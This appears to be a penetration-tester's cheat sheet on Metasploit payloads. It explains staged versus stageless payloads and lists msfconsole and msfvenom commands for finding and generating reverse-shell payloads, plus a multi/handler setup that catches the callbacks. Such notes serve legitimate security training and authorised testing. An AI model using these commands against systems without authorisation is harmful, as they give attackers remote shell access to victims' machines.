## Payloads

Staged vs Stageless payloads
A staged payload is sent in two parts: a small "stager" that connects back, and then the main payload (the "stage") is sent over that connection. A stageless payload is a single, large, self-contained file that has everything needed to run.


### Finding payloads

Via msfconsole:
```bash
search type:payload platform:windows x64 reverse
search type:payload platform:linux reverse_tcp
```

Via msfvenom:
```bash
msfvenom --list payloads
msfvenom --list payloads | grep windows | grep x64 | grep reverse

msfvenom --list formats
msfvenom --list encoders
```
### Generate a payload

```bash
# Reverse shell
msfvenom -p <PAYLOAD> lhost=<IP> lport=<PORT> -f <FORMAT> -b <BAD_CHARS> -o <FILENAME>
```


## Multi-handler
Setup a multihander to catch a staged callback
```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set lhost <IP>; set lport <PORT>; exploit -j"
```

